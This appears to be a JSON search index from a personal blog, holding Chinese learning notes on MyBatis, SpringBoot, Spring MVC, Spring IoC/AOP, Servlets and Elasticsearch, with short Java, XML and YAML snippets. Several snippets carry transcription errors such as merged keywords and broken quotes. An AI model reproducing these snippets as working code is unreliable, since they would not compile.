22 public class GeneratorSqlmap { public void generator() throws Exception { List\u0026lt;String\u0026gt; warnings = new ArrayList\u0026lt;String\u0026gt;(); boolean overwrite = true; // 指定配置文件 File configFile = new File(\u0026#34;./config/generatorConfig.xml\u0026#34;); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); } // 执行main方法以生成代码 public static void main(String[] args) { try { GeneratorSqlmap generatorSqlmap = new GeneratorSqlmap(); generatorSqlmap.generator(); } catch (Exception e) { e.printStackTrace(); } } } ","date":"2025-10-12T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251012201626030.png","permalink":"https://calendar0917.github.io/posts/mybatis/","title":"Mybatis"},{"content":"SpringBoot 简介 设计目的：简化Spring应用的初始搭建以及开发过程\nSpring 程序缺点\n依赖设置繁琐 去除 spring-web 和 spring-webmvc 坐标 配置繁琐 SpringBoot 核心功能及优点：\n起步依赖（简化依赖配置）\n自动配置\n辅助功能（内置服务器）\nparent 管理版本 由 parent 帮助开发者统一的进行各种技术的版本管理\n只控制版本，不负责导入坐标 1 2 3 4 5 \u0026lt;parent\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-parent\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.5.4\u0026lt;/version\u0026gt; \u0026lt;/parent\u0026gt; starter 依赖组合 starter定义了使用某种技术时对于依赖的固定搭配格式，使用starter可以帮助开发者减少依赖配置。\n引导类 这个类在SpringBoot程序中是所有功能的入口，称为引导类，最典型的特征就是当前类上方声明了一个注解 @SpringBootApplication。\n用于启动程序 创建并初始化 Spring 容器 内嵌 Tomcat 整合到了：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-web\u0026lt;/artifactId\u0026gt; \u0026lt;exclusions\u0026gt; \u0026lt;exclusion\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-tomcat\u0026lt;/artifactId\u0026gt; \u0026lt;/exclusion\u0026gt; \u0026lt;/exclusions\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 基础配置 默认配置文件：application.properties，配置指定属性即可\n配置文件间的加载优先级 properties（最高）\u0026gt; yml \u0026gt; yaml（最低） 不同配置文件中相同配置按照加载优先级相互覆盖，不同配置文件中不同配置全部保留 指定SpringBoot配置文件\nSetting → Project Structure → Facets 选中对应项目/工程 Customize Spring Boot 选择配置文件 YML 数据读取 使用Spring中的注解 @Value读取单个数据\n1 2 @Value(\u0026#34;${server.port}\u0026#34;) private int port; 使用默认配置类 SpringBoot 提供了一个对象，能够把所有的数据都封装到这一个对象中，这个对象叫做 Environment，使用自动装配注解可以将所有的yaml数据封装到这个对象中\n1 2 3 4 @Autowired private Environment env; ... env.getProperty(\u0026#34;...\u0026#34;); 使用自定义配置类 SpringBoot 也提供了可以将一组 yaml 对象数据封装一个 Java 对象的操作\nenterprise 指定加载某一组 yaml 配置\n1 2 3 4 5 6 7 @Component @ConfigurationProperties(prefix = \u0026#34;enterprise\u0026#34;) public class Enterprise { private String name; private Integer age; private String[] subject; } 数据引用 1 2 3 4 5 6 baseDir: /usr/local/fire center: dataDir: ${baseDir}/data tmpDir: ${baseDir}/tmp logDir: ${baseDir}/log msgDir: ${baseDir}/msgDir SSMP 整合 JUnit 1 2 3 4 5 6 7 8 9 10 11 12 13 @SpringBootTest(classes = Springboot04JunitApplication.class) // @ContextConfiguration(classes = Springboot04JunitApplication.class) class Springboot04JunitApplicationTests { //注入你要测试的对象 @Autowired private BookDao bookDao; @Test void contextLoads() { //执行要测试的对象对应的方法 bookDao.save(); System.out.println(\u0026#34;two...\u0026#34;); } } Mybatis 在配置、引入依赖时已经整合\n1 2 3 4 5 @Mapper public interface BookDao { @Select(\u0026#34;select * from tbl_book where id = #{id}\u0026#34;) public Book getById(Integer id); } 1 2 3 4 5 6 7 #2.配置相关信息 spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai username: root password: root Mybatis-plus 需要用阿里云的 url 导入\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.baomidou\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis-plus-boot-starter\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.4.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 配置所有数据库表名的前缀名：\n1 2 3 4 mybatis-plus: global-config: db-config: table-prefix: tbl_\t#设置所有表的通用前缀名称为tbl_ 其他 Lombok 简化POJO实体类开发，SpringBoot 目前默认集成了 lombok 技术\n可以通过一个注解@Data完成一个实体类对应的getter，setter，toString，equals，hashCode等操作的快速添加 1 2 3 4 5 6 7 \u0026lt;dependencies\u0026gt; \u0026lt;!--lombok--\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.projectlombok\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;lombok\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; ","date":"2025-10-12T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251012171949620.png","permalink":"https://calendar0917.github.io/posts/springboot%E5%AE%9E%E7%94%A8%E6%95%99%E7%A8%8B/","title":"SpringBoot"},{"content":"Spring MVC 主要覆盖表述层（Controller）\n简化接收前端参数、响应前端数据 工作流程 接收数据 路径设置 RequestMapping(\u0026quot;path\u0026quot;) 注解\nGetMapping(\u0026quot;...\u0026quot;)\n\u0026hellip;\u0026hellip;\n接收参数 param 参数名和 param 名相同，直接接收\n注解接收 RequestParam(value = \u0026quot;...\u0026quot;,required = \u0026quot;...\u0026quot;)\n多字符串，直接用集合接收\n必须要注解 封装为对象接收\n属性名必须等于参数名 路径传参 1 2 3 4 @RequestMapping(\u0026#34;{account}/{password}\u0026#34;) public String login(@PathVariable String account,@PathVariable String password){ return null; } Json 参数 定义接收的实体类 用 RequestBody 接收 原生 Java 不支持接收 Json\nhandlerMapper 中配置 Json 转换器，EnableWebMVC 用于给RequestMappingHandLerMapping、RequestMappingHandLerAdapter 添加Json处理器 Cookie @CookieValue\n存 Cookie：\n1 2 3 4 5 public String save(HttpServletResponse response){ Cookie cookie = new Cookie(name:\u0026#34;cookiellame\u0026#34;, value:\u0026#34;root\u0026#34;); response.addCookie(cookie); return \u0026#34;ok\u0026#34;; } 请求头 @RequestHeader\n原生 API 对象 共享域对象 Session、ServletContext\n原生获取 SpringMVC 提供\nmodel modeLMap map modeLAndView 响应数据 前后端不分离 不用 ResponseBody，配置 Jsp 模板地址，返回\n转发 return \u0026quot;forward:/jsp/...\u0026quot;\n返回 Json 直接 return User，会被自动封装\n需要 @ResponseBody 注解，不会走视图转换器 ResponseBody + Controller = RestController 返回静态资源 需要配置 Config\n1 2 3 4 5 6 7 //开启静态资源查找 //dispatcherServLet-\u0026gt;handLerMapping找有没有对应的handLer-\u0026gt;【没有-\u0026gt;找有没有静态资源】 @Override public void configurelDefaultServletHandling(DefaultServletHandlerConfigurer configurer）{ configurer.enable(); } Restful 风格 规定路径设计方式、参数传递格式、选择请求方式\n风格特点 每一个URI代表1种资源；\n客户端使用GET、POST、PUT、DELETE4个表示操作方式的动词对服务端资源进行操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资 源，DELETE用来删除资源；\n资源的表现形式是XML或者JSON；\n客户端与服务端之间的交互在请求之间是无状态的，从客户端到服务端的每个请求都必须包含理解请求所必需的信息。\n用请求方式 + URI 来表示操作、对象 路径传参：对应单一资源，如 id 其他扩展 全局异常处理 异常处理分类\n编程式：单独细化处理 声明式：统一处理 1 2 3 4 5 6 7 8 9 10 11 //全局异常发生，会走此类写的handLer！ //@ControLLerAdvice//可以返回逻辑视图转发和重定向的！ no usages @RestControllerAdvice//@ResponseBody直接返回json字符串 public class GlobalExceptionHandler{ //发生异常-\u0026gt;ControLLerAdvice注解的类型-\u0026gt;@ExceptionHandLer（指定的异常）-\u0026gt;handLer no usages @ExceptionHandler(ArithmeticException.class) public ObjectArithmeticExceptionHandler(ArithmeticException e){ //自定义处理异常即可handLer } 拦截器 HandlerIntercepter\n拦截器 Springmvc VS 过滤器 javaWeb:\n相似点 拦截: 必须先把请求拦住，才能执行后续操作 过滤: 拦截器或过滤器存在的意义就是对请求进行统一处理 放行: 对请求执行了必要操作后，放请求过去，让它访问原本想要访问的资源 不同点 工作平台不同 过滤器工作在 Servlet 容器中 拦截器工作在 SpringMVC 的基础上 拦截的范围 过滤器: 能够拦截到的最大范围是整个 Web 应用 拦截器: 能够拦截到的最大范围是整个 SpringMVC 负责的请求 IOC 容器支持 过滤器: 想得到 IOC 容器需要调用专门的工具方法，是间接的 拦截器: 它自己就在 IOC 容器中，所以可以直接从 IOC 容器中装配组件，也就是可以直接得到 IOC 容器的支持 使用 实现 HandlerInterceptor 接口\n修改类配置拦截器 SpringMvcConfig impLements WebMvcConfigurer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 配置拦截 publicvoid addInterceptors(InterceptorRegistry registry){ //配置方案1：拦截全部请求 registry.addInterceptor(new MyInterceptor()); //配置方案2：指定地址拦截.addPathPatterns（\u0026#34;/user/data\u0026#34;);； //*任意一层字符串**任意多层字符串 registry.addInterceptor(new MyInterceptor()) .addPathPatterns(\u0026#34;/user/**\u0026#34;); //配置方案3：排除拦截排除的地址应该在拦截地址内部！ registry.addInterceptor(new MyInterceptor()) .addPathPatterns(\u0026#34;/user/**\u0026#34;).excludePathPatterns(\u0026#34;/user/data1\u0026#34;); } 参数校验 hybernate 框架实现\n非空校验 @Validate\nNotNull：包装类型不为 null NotEmpty：集合类型长度大于 0 NotBlank：字符串不为 null，且不为 \u0026quot;\u0026quot; 通过 BindingResult 绑定错误，不直接返回\n","date":"2025-10-12T00:00:00Z","permalink":"https://calendar0917.github.io/posts/springmvc/","title":"SpringMVC"},{"content":"概述 Spring FrameWork 特点 非侵入式 控制反转 面向切面编程 容器化管理 组件化 一站式 IOC 控制反转 概述 Inversion of Control\n用容器管理所有 Java 对象的实例化和初始化，控制依赖关系，称为 SpringBean xml 配置文件\n抽象 BeanDefinitionReader 读取\n装配，读取信息，利用反射实例化\nBeanFactory、ApplicationContex 用 Context.getBean(\u0026quot;...\u0026quot;) 来获取\n基于 xml 管理 获取 Bean xml 定义\n1 \u0026lt;bean id=\u0026#34;helloworldone\u0026#34; class=\u0026#34;ccom.atguigu.spring6.bean.He11owor1d\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; Context.getBean(\u0026quot;...\u0026quot;) 获取\n1 2 //根据类型获取接口对应bean UserDaouserDao= context.getBean(UserDao.class); 依赖注入 set 注入 xml 中进行配置 构造器注入 \u0026lt;constructor-arggname=\u0026quot;bnamevalue=\u0026quot;java开发\u0026quot;\u0026gt;\u0026lt;/constructor-arg\u0026gt; 是不是只能注入默认值？\n特殊值注入\n对象中注入其他对象（表示关系） 法一：引入外部/内部类，bean 标签中嵌套 ref 法二：级联赋值，直接嵌套对所注入的对象的属性的赋值 数组类型注入\n配置中的 \u0026lt;array\u0026gt;标签 List 集合属性注入\n先定义 Bean，再用 \u0026lt;list\u0026gt; 标签注入 map 集合属性注入\n\u0026lt;map\u0026gt;\u0026lt;entry\u0026gt;\u0026lt;key\u0026gt; 标签 引用集合类型（？util 整合）\np 命名空间注入\n防止 7.中的util 的名称冲突 引入外部属性 创建外部属性文件 .property\nxml 中配置读取即可\n作用域 配置 scope 来指定作用域\nsingleton 单例 prototype 多例，每次获取时创建 生命周期 FactoryBean 机制 根据接口实现 FactoryBean，自定义 getObjet（）方法返回值，来控制产生的对象\n用于整合第三方框架(?) 基于注解注解管理 开启组件扫描 1 2 \u0026lt;!--开启组件扫描功能--\u0026gt; \u0026lt;context:component-scanbase-package=\u0026#34;com.atguigu.spring6\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; 注解说明 @Autowired 注入 set 方法注入 1 2 3 4 @Autowired public void setUserService(UserService userService) { this.userService = userService; } 构造方法注入\n形参上注入\n根据名称进行注入（而非接口名）\n一个接口有多个实现类时 @Qualifier @Resource 注入 默认根据 name 标签进行注入\n全注解开发 无需使用配置文件，写一个配置类替代配置文件\n1 2 3 4 5 @configuration //@componentscan({\u0026#34;com.atguigu.spring6.controller\u0026#34; //\u0026#34;com.atguigu.spring6.service\u0026#34;,\u0026#34;com.atguigu.spring6.dao\u0026#34;}) @componentscan(\u0026#34;com.atguigu.spring6\u0026#34;) public class Spring6config {} 手写 IoC 反射 获取对象： 1 2 3 4 5 6 7 8 9 10 public void test01(）{ //1 类名.cLass Class clazz1 = Car.class; //2 对象.getCLass() Class clazz2 =newv Car().getclass(); //3 CLass.forName（\u0026#34;全路径\u0026#34;） Class clazz3 = Class.forName( className: \u0026#34;......\u0026#34;); //实例化 Object o = clazz3.getDeclaredConstructor().newInstance(); } 获取方法： 1 2 3 4 5 6 7 8 public void test02() throws Exception { Classclazz = Car.class; 1/获取所有构造 Constructor[]] constructors = clazz.getconstructors(); for (Constructor c:constructors) {......} // 方法名：c.getname() 参数个数(public)：c.getConstructor() // 参数个数(所有)：c.getDeclaredConstructor() } 构造对象： 1 2 3 Constructorc2=（clazz.getDeclaredConstructor(......) c2.setAccessible(true); Car car2 = (Car)c2.newInstance( ..initargs: \u0026#34;捷达\u0026#34;， 15,“白色\u0026#34;); 获取属性： 1 2 3 4 5 6 7 8 Classclazz = Car.class; //获取所有pubLic属性 Field[] fields = clazz.getFields(); //获取所有属性（包含私有属性） Field[] fields = clazz.getDeclaredFields(); for (Field field:fields）{ System.out.println(field.getName()); } 操作方法 1 2 3 4 5 6 7 8 private方法 Method[] methodsAll = clazz.getDeclaredMethods(); for (Method m:methodsAll) { //执行方法 runI if(m.getName().equals(\u0026#34;run\u0026#34;)) { m.setAccessible(true); m.invoke(car) ; } 实现 步骤 创建注解：@Bean创建对象、@Di属性注入\n创建bean容器接口：ApplicationContext\n定义方法，返回对象\n实现bean容器接口：返回对象、根据包规则加载bean\n配置 @Bean\n1 2 3 4 @Target(ElementType.TYPE) // 目标 @Retention(RetentionPolicy.RUNTIME) // 运行范围 public @interface Bean } @Di\nApplicationCotext 接口\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //创建有参数构造，传递包路径，设置包扫描规则 //扫描当前包及其子包，哪个类有@Bean注解，把这个类通过反射实例化 public AnnotationApplicationContext implement ApplicationContext(String basePackage) { // 路径转义,点替换为斜杠 String packagePath = basePackage.replaceAll(\u0026#34;\\\\.\u0026#34;,\u0026#34;\\\\\\\\\u0026#34;) // 获取绝对路径 Enumeration\u0026lt;URL\u0026gt; urls = Thread.currentThread().getContextClassLoader()·getResources(packagePath); while(urls.hasMoreElements()) { URL url = urls.nextElement(); String filePath= URLDecoder.decode(url.getFile(), \u0026#34;utf-8\u0026#34;); loadBean(new File(filePath)); // 实现 loadBean 方法 } loadDi(); // 实现 loadDi 方法 } public static void loadBean(File file){ // 1.判断当前内容是否是文件夹 // 2.是，则获取当前文件夹所有内容 // 3.文件夹为空，返回空 // 4.文件夹不为空，遍历文件夹所有内容 // 4.1.遍历每个File对象，继续判断，如果还是文件，递归 // 4.2.不是文件夹，是文件 // 4.3.得到包文件 + 类名称部分 // 4.4.判断当前文件类型是否.cLass // 4.5.如果是.cLass类型，把路径\\替换成。把.cLass去掉 // 4.6.判断类上面是否有注解@Bean，如果有实例化过程 // 4.7.把对象实例化之后，放到map集合bearFactory } private void loadDi() { //实例化对象在beanFactory的map集合里面 //1遍历beanFactory的map集合 //2获取map集合每个对象（vaLue），每个对象属性获取到 //3遍历得到每个对象属性数组，得到每个属性 //4判断属性上面是否有@Di注解 //5如果有@Di注解，把对象进行设置（注入） } AOP 面向切面 引入 问题：\n要抽取的代码在方法内部，无法通过抽取到父类解决 代理模式：\n在调用目标方法时，不直接调用，而是通过代理类调用\n代理：将非核心逻辑剥离出来以后，封装这些非核心逻辑的类、对象、方法\n目标：代理“套用\u0026quot;了非核心逻辑代码的类、对象、方法\n优化：\n静态代理：再创建一个代理类，实现其他方法，再调用原有类\n问题：还是僵化，无法动态调整 动态代理：创建动态代理对象 ProxyFactory，用反射统一管理\nAOP：通过预编译和动态代理，在不修改程序源码情况下，给程序添加功能\n抽取横切关注点\n整合横切关注点为通知方法\n将各种通知方法整合为切面类\n基于注解实现 分类：\nJDK：代理对象和目标对象实现相同接口（目标有接口时）\ncglib：通过继承目标类\nAspectJ：基于静态代理，将代理逻辑植入编译的字节码文件，效果是动态的，Spring借助了其中的注解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 @Aspect//切阻尖 @Component //ioc容器 public class LogAspect { //设置切入点和通知类型 //通知类型： //前置 @Before(value = \u0026#34;切入点表达式\u0026#34;) public void beforeMethod(JoinPoint joinPoint) { StringmethodName = joinPoint.getSignature().getName(); Object[] args = jqinPoint.getArgs(); // 获取连接点的信息 } //返回 @AfterReturning //异常 @AfterThrowing //后置 @After() //环绕 @Around() } @Order 控制切面优先级\n基于 xml 实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;context:component-scanbase-package=\u0026#34;com.atguigu.aop.xml\u0026#34;\u0026gt;\u0026lt;/context:component-scan\u0026gt; \u0026lt;aop:config\u0026gt; \u0026lt;!--配置切面类--\u0026gt; \u0026lt;aop:aspect ref=\u0026#34;loggerAspect\u0026#34;\u0026gt; \u0026lt;aop:pointcut id=\u0026#34;pointcut\u0026#34; expression=\u0026#34;execution(*com.atguigu.aop.xml.calculatorImpl.*(..))\u0026#34;/\u0026gt; \u0026lt;aop:before method=\u0026#34;beforeMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:before\u0026gt; \u0026lt;aop:after method=\u0026#34;afterMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after\u0026gt; \u0026lt;aop:after-returning method=\u0026#34;afterReturningMethod\u0026#34;returning=\u0026#34;result\u0026#34;pointcut- ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after-returning\u0026gt; \u0026lt;aop:after-throwing method=\u0026#34;afterThrowingMethod\u0026#34;throwing=\u0026#34;ex\u0026#34;pointcut- ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:after-throwing\u0026gt; \u0026lt;aop:around method=\u0026#34;aroundMethod\u0026#34;pointcut-ref=\u0026#34;pointcut\u0026#34;\u0026gt;\u0026lt;/aop:around\u0026gt; \u0026lt;/aop:aspect\u0026gt; \u0026lt;/aop:config\u0026gt; 事务 JDBC Template 增：\n1 2 3 4 5 6 7 //1添加操作 //第一步编写sqL语句 String Sql = \u0026#34;INSERT INTO t_emp VALUES(NULL,?,?,?)\u0026#34;;I //第二步调用jdbcTempLate的方法，传入相关参数 //Object[］ params ={\u0026#34;东方不败\u0026#34;，20，\u0026#34;未知\u0026#34;}; //int rows = jdbcTemplate.update(sql,params); int rows = jdbcTemplate.update(sql, ..args:\u0026#34;东方不败\u0026#34;，20，\u0026#34;未知\u0026#34;); 改：\n1 2 3 //2修改操作 String sql =\u0026#34;update t_emp set name=? where id=?\u0026#34;; int rows =jdbcTemplate.update(sql, ..args: \u0026#34;林平之atguigu\u0026#34;,3）; 删：\n1 2 3 //3删除操作 String sql\u0026#39;deletefromt_empwhere id=?\u0026#34;; introws=jdbcTemplate.update(sql, ..args: 3); 查：\n1 2 3 4 5 public void testSelectObject() { String sql=\u0026#34;select*from t_emp List\u0026lt;Emp\u0026gt;list = jdbcTemplate.query(sql, new BeanPropertyRowMapper\u0026lt;\u0026gt;(Emp.class)); } 基于注解的声明式事务 保证事务的一致性、隔离性、持久性、原子性\nTransactional 标签声明事务，可以设置：\n只读 超时 回滚策略，哪些异常不回滚 隔离级别 传播行为，事务方法之间调用的处理逻辑 全注解 不用 XML，改用配置类\n","date":"2025-10-10T00:00:00Z","permalink":"https://calendar0917.github.io/posts/spring/","title":"Spring"},{"content":"Tomcat 服务器容器，将服务部署（deploy）到容器内\n目录结构：\nbin 可执行文件目录 conf 配置文件目录 webapps 项目部署的目录 项目内容存放到 webapps-name-WEBINF 文件夹下，即可访问 work 工作目录 Servlet 获取参数 在 web.xml 中定义 servlet-mapping，指定接收 url 请求对应的类 现在支持注解注册 @WebServlet(\u0026quot;\\...\u0026quot;) 定义类，继承 HttpServlet ，实现 doPost 方法 再调用 DAO、DAOImpl 更改数据库 继承关系 Servlet 接口\nvoid init（config） 初始化方法\nvoid service(request,response) 服务方法 （收到请求自动调用）\nvoid destory() 销毁方法\nServlet 父类、抽象类\ngenericServlet 抽象类，用于处理子类没有实现的方法（抛错误） httpServlet 实现类，具体处理逻辑 生命周期 默认情况下：\n第一次接收请求时，这个servlet会进行实例化（调用构造方法）、初始化（调用init())）、然后服务（调用service()）\n默认只会有一个 Servlet 示例 单例的，线程不安全的 \u0026ndash;\u0026gt; 尽量不在 Servlet 中定义、修改成员变量 第二次请求开始，每一次都是服务\n当容器关闭时，其中的所有的 servlet 实例会被销毁，调用销毁方法\nHttp 协议 超文本传输协议，是无状态的\n请求内容\n请求行 方式、URL、HTTP版本 请求头 Host、Referer、Cookie…… 请求体 响应内容\n响应行 协议、状态码（200）、响应状态（ok） 响应消息头 Server、Content-type…… 响应体 Session 会话跟踪技术，解决 http 的无状态问题。\nrequest.getSession，获取、自动分配 Session\nsession.setAttribute，保存 session 作用域 服务器端内部转发和客户端重定向 内部转发：同一请求、不同服务组件之间转发处理\ngetdepatcher\u0026hellip; 重定向：返回客户端一个新的服务，使其重新请求\nredirect\u0026hellip; Thymeleaf 视图模板技术 辅助渲染从 DAO 获取的数据到前端\n引入模板 将查询的数据动态显示 th: if... unless... each... text...\n保存作用域 request：一次请求有效 session：一次会话范围有效 application：一次应用程序范围内有效（上下文） 小项目 编辑、修改特定信息\n变量的获取 url/(fid=${name.fid}) 跳转到编辑页面，获取数据 MVC Servlet优化 Servlet 整合 问题：\nServlet 组件过多 优化：\n将各种 Servlet 整合到一个 Controller 中，作为方法 用路径区分操作要求 通过 Switch ... case ... 进行跳转，执行 DAO 再用反射优化，this.getClass().getDeclaredMethods(); DispatcherServlet 中央控制器 抽取路径、反射代码 拦截、处理指定请求，修改路径再传输到 Controller\n将每个 Controller 的反射代码再抽取到父类\n注意，这样的 Controller 继承 DispatcherServlet，不能再自动调用 Init（），需要另外处理\n解析 xml 配置文件 定位指定 Controller 读取 bean 配置，整合为 map\u0026lt;id,object\u0026gt;，寻找指定方法 抽取重定向 Controller处理后，return 一个字符串，再交给 DispatcherServlet 处理\n抽取传入参数 获取参数的过程同一抽取到 DispatcherServlet\njdk 8 新特性，通过反射获取方法参数的方法名 将得到的参数拆包、赋值、类型转换后，再传递给 Controller 初始化 重写 init（）方法，通过注解或 xml，向初始化方法中添加参数\nService model：模型层 pojo/vo、DAO（数据访问对象，单精度方法）、BO（业务对象） 在 Controller 与 DAO 间添加 Service 层 controller：控制 view：视图 IOC 控制反转 实现 Bean 的自动装配，整理 xml 映射文件\n将解析出的实例创建并存放在 beanmap 中，beanmap 存放在 BeanFactory 中，改变示例生命周期（存放到 IOC 容器中），需要时取用即可 1 2 3 Field propertyField = beanClazz.getDeclaredField(propertyName); propertyField.setAccessible(true); propertyField.set(beanobj,refobj); Filter 过滤器 拦截请求、响应\n实现 Filter 接口，@WebFilter(\u0026quot;...\u0026quot;)\n改写 doFilter，后放行（执行 Service）filterchain.doFilter(...)\n接收到 Service 后，继续执行完 doFilter\n过滤器链\n执行顺序：根据全类名、xml 配置的顺序 事务管理 一个 Service 需要作为一个整体，操作多个数据库时要保证同时成功或失败\n将 try …… catch 放到 Filter 当中处理，统一回滚 用 ThreadLocal 来保证对象、线程（Connection）的同一性 OpenSessionInViewFilter 的实现 事务管理封装为 TransactionManager，实现开启、提交、回滚事务的方法\n本来分开的 commit、rollback 等，手动进行管理 注意内部不能 catch 异常，需要都交给 Filter 处理 或者 catch 为新的异常抛出 ThreadLocal 的实现源码 1 2 3 4 5 6 7 8 public void set(T value) Thread t=Thread.currentThread();//获取当前的线程 ThreadLocalMap map = getMap(t);//每一个线程都维护各自的一个容器(ThreadLocalMap) iff (map != null) map.set((this)value);//用map，支持多个对象存储 else createMap(t, value) ; } Listener 监听器 监听各种对象的创建、销毁；保存作用域的变化；对象在 Session 中的创建与移除、序列化与反序列化\n将 IOC 整合到 Listener 中（监听上下文启动），提前初始化，提高响应速度（减慢启动速度） QQZone 笔记 数据库 设计 先写出功能，再分析：\n抽取实体：用户登录信息、用户详情信息、日志、回贴、主人回复 分析其中属性 用户登录信息：账号、密码、头像、昵称 用户详情信息：真实姓名、星座、血型、邮箱、手机号 日志：标题、内容、日期、作者 回复：内容、日期、作者、日志 分析实体之间关系 一对一 or 一对多 or 多对多 范式 第一范式：列不可再分（空间尽量小）\n第二范式：一张表只表达一层含义\n第三范式：表中每一列和逐渐都是直接依赖关系（与多表连接查询权衡）\n根据数据库查询频次、量，调整规范性 主键尽量不与业务产生联系\n直接用自增组件 实体类 - POJO 定义对应属性，有关系的要对应\n1 2 private UserDetail userDetail//1:1 private List\u0026lt;Topic\u0026gt; topiqList//1:N 数据层 - DAO 接口、impl，实现查询\n业务层 - Service 接口、impl，整合 DAO 层\n","date":"2025-10-09T00:00:00Z","permalink":"https://calendar0917.github.io/posts/javaweb-servlet/","title":"JavaWeb-Servlet"},{"content":"初识 分布式的开源搜索引擎\n提供 Restful 接口，所有语言均可调用\nELK技术栈：\n结合 kibana（可视化）、Logstash、Beats 用于日志分析、事实监控等 倒排索引 正向索引：\n传统数据库使用，查询需要逐一遍历 倒排索引：\ndocument：文档，每条数据就是一个文档 term：词条，由文档按语义划分，有限且唯一 先搜词条，再根据词条找文档 IK分词器 作为 ES 插件导入\n根据现有词典（可拓展）对文档进行划分\n基础概念 索引库：\n相同类型的文档（Json存储）的集合 映射：\n索引库中对文档的约束 mapping 属性 type：字段数据类型\nindex：是否创建索引\nanalyzer：分词器\npropertis：嵌套的子字段\n索引库操作 RESTFUL 规范\n不同请求方式对应不同请请求类型 创建索引库和mapping的请求语法如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 PUT /索引库名称 { \u0026#34;mappings\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;字段名1\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;text\u0026#34;, \u0026#34;analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34; }, \u0026#34;字段名2\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34;, \u0026#34;index\u0026#34;: \u0026#34;false\u0026#34; }, \u0026#34;字段名3\u0026#34;: { \u0026#34;properties\u0026#34;: { \u0026#34;子字段\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;keyword\u0026#34; } } }, // …略 } } } 支持 put、get、delete\n文档操作 新增文档：\n1 2 3 4 5 6 7 8 9 10 POST /索引库名/_doc/文档id { \u0026#34;字段1\u0026#34;: \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34;: \u0026#34;值2\u0026#34;, \u0026#34;字段3\u0026#34;: { \u0026#34;子属性1\u0026#34;: \u0026#34;值3\u0026#34;, \u0026#34;子属性2\u0026#34;: \u0026#34;值4\u0026#34; }, // … } 修改\nput 全量修改，先删除再新建 post 增量修改 批处理\n1 2 3 4 5 6 7 8 9 10 POST /_bulk { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;index\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;索引库名\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34; } } { \u0026#34;字段1\u0026#34; : \u0026#34;值1\u0026#34;, \u0026#34;字段2\u0026#34; : \u0026#34;值2\u0026#34; } { \u0026#34;delete\u0026#34; : { \u0026#34;_index\u0026#34; : \u0026#34;test\u0026#34;, \u0026#34;_id\u0026#34; : \u0026#34;2\u0026#34; } } { \u0026#34;update\u0026#34; : {\u0026#34;_id\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;_index\u0026#34; : \u0026#34;test\u0026#34;} } { \u0026#34;doc\u0026#34; : {\u0026#34;field2\u0026#34; : \u0026#34;value2\u0026#34;} } DSL 查询 分类：\n叶子查询：特定字段查询特定值 复合查询：逻辑方式组合叶子查询 基本语法：\n1 2 3 4 5 6 7 8 GET /indexName/_search { \u0026#34;query\u0026#34;: { 